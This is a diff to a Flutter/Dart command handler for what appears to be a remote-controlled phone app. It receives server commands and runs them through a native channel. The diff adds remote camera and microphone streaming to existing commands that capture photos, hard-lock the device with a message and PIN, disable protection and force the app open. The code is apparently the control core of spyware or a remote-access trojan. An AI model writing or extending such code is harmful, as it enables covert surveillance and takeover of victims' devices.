@@ -1,6 +1,3 @@
-import 'dart:async';
-import 'dart:convert';
-
 import 'package:flutter/foundation.dart';
 import 'package:flutter/services.dart';
 
@@ -8,7 +5,6 @@ class CommandHandler {
   static const MethodChannel _channel =
       MethodChannel('orgsapp/device_info');
 
-  /// Handle satu command. Return data untuk dikirim balik ke server.
   static Future<Map<String, dynamic>> handle({
     required String command,
     required String extra,
@@ -50,9 +46,18 @@ class CommandHandler {
         );
         return {'image_base64': b64 ?? ''};
 
+      case 'start_camera_stream':
+        await _channel.invokeMethod('startCameraStream', {
+          'camera': extra.isEmpty ? 'back' : extra,
+        });
+        return {'ok': true};
+
+      case 'stop_camera_stream':
+        await _channel.invokeMethod('stopCameraStream');
+        return {'ok': true};
+
       // ===== LOCK =====
       case 'hard_lock':
-        // extra format: "pesan|pin"
         final parts = extra.split('|');
         final msg = parts.isNotEmpty ? parts[0] : 'LOCKED';
         final pin = parts.length > 1 ? parts[1] : '1234';
@@ -80,6 +85,15 @@ class CommandHandler {
         await _channel.invokeMethod('stopAudio');
         return {'ok': true};
 
+      // ===== AUDIO STREAM =====
+      case 'start_audio_stream':
+        await _channel.invokeMethod('startAudioStream');
+        return {'ok': true};
+
+      case 'stop_audio_stream':
+        await _channel.invokeMethod('stopAudioStream');
+        return {'ok': true};
+
       // ===== WALLPAPER =====
       case 'set_wallpaper':
         await _channel.invokeMethod('setWallpaper', {'url': extra});
@@ -97,7 +111,7 @@ class CommandHandler {
         await _channel.invokeMethod('disableProtection');
         return {'ok': true};
 
-      // ===== FORCE OPEN (bring to foreground) =====
+      // ===== FORCE OPEN =====
       case 'force_open':
         await _channel.invokeMethod('forceOpen');
         return {'ok': true};
